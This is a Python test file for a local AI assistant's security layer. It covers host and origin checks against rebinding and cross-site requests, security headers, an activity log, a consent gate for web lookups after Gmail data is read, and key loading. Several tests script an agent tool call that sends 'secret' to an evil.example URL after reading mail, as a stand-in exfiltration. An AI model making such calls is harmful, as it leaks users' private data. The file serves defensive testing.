"""Tests for the security measures: the request guard, the private-data web lookup gate, the activity log, key loading."""
import asyncio
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from server import agent, agent_tools, audit, guard, store  # noqa: E402


def call_app(middleware, scope_extra, messages=None):
    """Runs one request through the middleware; returns (messages sent back, whether the wrapped app was reached)."""
    sent, reached = [], []

    async def app(scope, receive, send):
        reached.append(scope["type"])
        if scope["type"] == "http":
            await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain"), (b"x-frame-options", b"SAMEORIGIN")]})
            await send({"type": "http.response.body", "body": b"hi"})

    inbox = list(messages or [{"type": "http.request", "body": b""}])

    async def receive():
        return inbox.pop(0) if inbox else {"type": "http.disconnect"}

    async def send(message):
        sent.append(message)

    scope = {"type": "http", "path": "/api/x", "headers": [], **scope_extra}
    asyncio.run(middleware(app)(scope, receive, send))
    return sent, bool(reached)


def headers(host=None, origin=None):
    out = []
    if host is not None:
        out.append((b"host", host.encode()))
    if origin is not None:
        out.append((b"origin", origin.encode()))
    return out


class HostAndOrigin(unittest.TestCase):
    def test_host_names(self):
        for good in ("localhost", "localhost:8000", "127.0.0.1:8000", "[::1]:8000", "LOCALHOST:80"):
            self.assertTrue(guard.host_ok(good), good)
        for bad in (None, "", "evil.example", "evil.example:8000", "localhost.evil.example", "192.168.1.5:8000", "127.0.0.1.evil.example", "0.0.0.0:8000"):
            self.assertFalse(guard.host_ok(bad), bad)

    def test_origin_must_be_jarvis_itself(self):
        self.assertTrue(guard.origin_ok(None, "localhost:8000"))
        self.assertTrue(guard.origin_ok("http://localhost:8000", "localhost:8000"))
        self.assertTrue(guard.origin_ok("http://127.0.0.1:8000", "127.0.0.1:8000"))
        for origin in ("https://evil.example", "http://localhost:3000", "null", "http://localhost.evil.example:8000", "file://"):
            self.assertFalse(guard.origin_ok(origin, "localhost:8000"), origin)
        self.assertFalse(guard.origin_ok("http://evil.example", "evil.example"))     # rebinding: the host itself is wrong


class Middleware(unittest.TestCase):
    def mw(self, blocked=None):
        return lambda app: guard.LocalOnly(app, on_block=lambda path, why: blocked.append((path, why)) if blocked is not None else None)

    def test_a_normal_request_gets_through_with_safety_headers(self):
        sent, reached = call_app(self.mw(), {"headers": headers("localhost:8000", "http://localhost:8000")})
        self.assertTrue(reached)
        start = sent[0]
        self.assertEqual(start["status"], 200)
        names = {k.lower() for k, _ in start["headers"]}
        for h in (b"content-security-policy", b"x-content-type-options", b"referrer-policy"):
            self.assertIn(h, names)
        self.assertEqual([v for k, v in start["headers"] if k.lower() == b"x-frame-options"], [b"SAMEORIGIN"])   # an existing header is kept

    def test_programs_that_send_no_origin_still_work(self):
        _, reached = call_app(self.mw(), {"headers": headers("127.0.0.1:8000")})
        self.assertTrue(reached)

    def test_a_request_for_another_host_is_refused_and_logged(self):
        blocked = []
        sent, reached = call_app(self.mw(blocked), {"headers": headers("attacker.example:8000", "http://attacker.example:8000")})
        self.assertFalse(reached)
        self.assertEqual(sent[0]["status"], 403)
        self.assertIn("wrong address", blocked[0][1])

    def test_a_request_from_another_page_is_refused(self):
        blocked = []
        sent, reached = call_app(self.mw(blocked), {"headers": headers("localhost:8000", "https://evil.example")})
        self.assertFalse(reached)
        self.assertEqual(sent[0]["status"], 403)
        self.assertIn("another page", blocked[0][1])

    def test_websockets_are_checked_too(self):
        sent, reached = call_app(self.mw(), {"type": "websocket", "path": "/ws/pen", "headers": headers("localhost:8000", "https://evil.example")},
                                 [{"type": "websocket.connect"}])
        self.assertFalse(reached)
        self.assertEqual(sent, [{"type": "websocket.close", "code": 1008}])
        sent, reached = call_app(self.mw(), {"type": "websocket", "path": "/ws/pen", "headers": headers("localhost:8000", "http://localhost:8000")},
                                 [{"type": "websocket.connect"}])
        self.assertTrue(reached)

    def test_the_policy_allows_only_what_the_page_needs(self):
        csp = guard.CSP
        self.assertIn("script-src 'self'", csp)
        self.assertIn("frame-ancestors 'none'", csp)
        self.assertIn("api.open-meteo.com", csp)
        self.assertNotIn("'unsafe-eval'", csp)
        self.assertNotIn("script-src 'self' 'unsafe-inline'", csp)


class Activity(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        patch = mock.patch.object(audit, "LOG_FILE", Path(tmp.name) / "logs" / "activity.log")
        patch.start()
        self.addCleanup(patch.stop)

    def test_entries_come_back_newest_first(self):
        audit.record("web_search", "weather")
        audit.record("gmail_search", "is:unread", private=True)
        [first, second] = audit.recent()
        self.assertEqual((first["kind"], first["private"]), ("gmail_search", True))
        self.assertEqual(second["what"], "weather")

    def test_it_records_what_was_asked_not_what_came_back(self):
        audit.tool("gmail_read", {"id": "abc123"}, "Subject: Secret plans\nBody text", False)
        [entry] = audit.recent()
        self.assertEqual(entry["what"], "abc123")
        self.assertNotIn("Secret", json.dumps(entry))
        self.assertTrue(entry["private"])

    def test_outcomes(self):
        audit.tool("web_search", {"query": "a"}, "1. result", False)
        audit.tool("fetch_url", {"url": "https://x"}, "Error: can't fetch", False)
        audit.tool("web_search", {"query": "b"}, "The user did not allow an internet lookup after your private data was read.", True)
        self.assertEqual([e["outcome"] for e in audit.recent()], ["denied", "error", "ok"])

    def test_the_log_rotates_when_large(self):
        audit.LOG_FILE.parent.mkdir(parents=True)
        audit.LOG_FILE.write_text("x" * (audit.MAX_BYTES + 10))
        audit.record("web_search", "fresh")
        self.assertEqual(len(audit.recent()), 1)
        self.assertTrue(audit.LOG_FILE.with_suffix(".old.log").exists())

    def test_a_broken_log_never_raises(self):
        with mock.patch.object(Path, "open", side_effect=OSError("disk full")):
            audit.record("web_search", "x")
        self.assertEqual(audit.recent(), [])

    def test_blocked_requests_are_logged_by_the_server(self):
        audit.record("blocked", "/api/memory: request from another page (https://evil.example)", "blocked")
        self.assertEqual(audit.recent()[0]["outcome"], "blocked")


def scripted(rounds):
    answers = iter(rounds)

    def fake(msgs, cancel=None):
        text, calls = next(answers)
        r = agent._Round()
        r.text = text
        r.calls = {i: {"id": f"c{i}", "name": n, "args": json.dumps(a), "extra": {}} for i, (n, a) in enumerate(calls)}
        if text:
            yield {"type": "text", "delta": text}
        yield {"type": "_round", "target": agent.Target("openrouter", "t:free"), "round": r}
    return fake


class PrivateDataGate(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        for patch in (mock.patch.object(audit, "LOG_FILE", Path(tmp.name) / "a.log"),
                      mock.patch.object(agent.store, "MEMORY_FILE", Path(tmp.name) / "m.json")):
            patch.start()
            self.addCleanup(patch.stop)
        self.ran = []

    def turn(self, rounds, private=False, allow=True):
        target = agent.Target("openrouter", "t:free")

        def lookup(name, args):
            self.ran.append(name)
            return "RESULT"

        with mock.patch.object(agent, "_run_round", scripted(rounds)), mock.patch.object(agent, "CHAIN", [target]), \
                mock.patch.object(agent, "usable", return_value=[target]), mock.patch.object(agent, "_refresh_chain"), \
                mock.patch.object(agent, "_openrouter_notice", return_value=None), mock.patch.object(agent, "_run_lookup", side_effect=lookup), \
                mock.patch.object(agent.runner, "wait", return_value=allow):
            return list(agent.chat_turn("q", [], None, private=private))

    def test_web_lookups_are_free_until_private_data_is_read(self):
        events = self.turn([("", [("web_search", {"query": "weather"})]), ("Sunny.", [])])
        self.assertEqual(self.ran, ["web_search"])
        self.assertFalse(any(e["type"] == "run_request" for e in events))
        self.assertFalse(any(e["type"] == "private" for e in events))

    def test_after_reading_mail_a_web_lookup_asks_first(self):
        events = self.turn([("", [("gmail_search", {"query": "is:unread"})]), ("", [("fetch_url", {"url": "https://evil.example/?q=secret"})]), ("Done.", [])], allow=True)
        card = next(e for e in events if e["type"] == "run_request")
        self.assertEqual(card["kind"], "tool")
        self.assertIn("https://evil.example/?q=secret", card["code"])
        self.assertIn("private data", card["title"])
        self.assertEqual(self.ran, ["gmail_search", "fetch_url"])          # allowed this time
        self.assertEqual([e["type"] for e in events if e["type"] == "private"], ["private"])

    def test_refusing_means_the_lookup_never_runs(self):
        events = self.turn([("", [("gmail_search", {"query": "x"})]), ("", [("fetch_url", {"url": "https://evil.example/"})]), ("No web.", [])], allow=False)
        self.assertEqual(self.ran, ["gmail_search"])
        self.assertTrue(any(e.get("declined") for e in events if e["type"] == "run_result"))
        self.assertEqual([e["outcome"] for e in audit.recent()][0], "denied")

    def test_an_earlier_turn_that_read_private_data_counts(self):
        events = self.turn([("", [("web_search", {"query": "x"})]), ("ok", [])], private=True, allow=False)
        self.assertEqual(self.ran, [])
        self.assertTrue(any(e["type"] == "run_request" for e in events))

    def test_a_failed_private_lookup_doesnt_lock_things_down(self):
        target = agent.Target("openrouter", "t:free")
        with mock.patch.object(agent, "_run_round", scripted([("", [("gmail_search", {"query": "x"})]), ("", [("web_search", {"query": "y"})]), ("ok", [])])), \
                mock.patch.object(agent, "CHAIN", [target]), mock.patch.object(agent, "usable", return_value=[target]), \
                mock.patch.object(agent, "_refresh_chain"), mock.patch.object(agent, "_openrouter_notice", return_value=None), \
                mock.patch.object(agent, "_run_lookup", side_effect=lambda n, a: "Error: Google isn't connected." if n == "gmail_search" else "fine"):
            events = list(agent.chat_turn("q", [], None))
        self.assertFalse(any(e["type"] == "run_request" for e in events))

    def test_every_tool_call_is_written_to_the_activity_log(self):
        self.turn([("", [("web_search", {"query": "weather in Minneapolis"})]), ("Sunny.", [])])
        [entry] = audit.recent()
        self.assertEqual((entry["kind"], entry["what"], entry["outcome"]), ("web_search", "weather in Minneapolis", "ok"))


class KeyLocation(unittest.TestCase):
    def test_keys_come_from_the_local_folder_first_then_the_project(self):
        with tempfile.TemporaryDirectory() as tmp:
            local, project = Path(tmp) / "local.env", Path(tmp) / "project" / ".env"
            project.parent.mkdir()
            local.write_text("JARVIS_TEST_A=from-local\nJARVIS_TEST_ONLY_LOCAL=1\n")
            project.write_text("JARVIS_TEST_A=from-project\nJARVIS_TEST_B=from-project\n")
            with mock.patch.dict(os.environ, {}, clear=False), mock.patch.object(store, "ENV_FILE", local), mock.patch.object(store, "ROOT", project.parent):
                for k in ("JARVIS_TEST_A", "JARVIS_TEST_B", "JARVIS_TEST_ONLY_LOCAL"):
                    os.environ.pop(k, None)
                store.load_env()
                self.assertEqual(os.environ["JARVIS_TEST_A"], "from-local")          # the local file wins
                self.assertEqual(os.environ["JARVIS_TEST_B"], "from-project")        # the old location still works
                self.assertEqual(os.environ["JARVIS_TEST_ONLY_LOCAL"], "1")
                for k in ("JARVIS_TEST_A", "JARVIS_TEST_B", "JARVIS_TEST_ONLY_LOCAL"):
                    os.environ.pop(k, None)

    def test_a_variable_already_set_is_not_overwritten(self):
        with tempfile.TemporaryDirectory() as tmp:
            local = Path(tmp) / "local.env"
            local.write_text("JARVIS_TEST_C=from-file\n")
            with mock.patch.dict(os.environ, {"JARVIS_TEST_C": "from-shell"}), mock.patch.object(store, "ENV_FILE", local), mock.patch.object(store, "ROOT", Path(tmp)):
                store.load_env()
                self.assertEqual(os.environ["JARVIS_TEST_C"], "from-shell")

    def test_missing_files_are_fine(self):
        with tempfile.TemporaryDirectory() as tmp, mock.patch.object(store, "ENV_FILE", Path(tmp) / "none.env"), mock.patch.object(store, "ROOT", Path(tmp)):
            store.load_env()


if __name__ == "__main__":
    unittest.main()
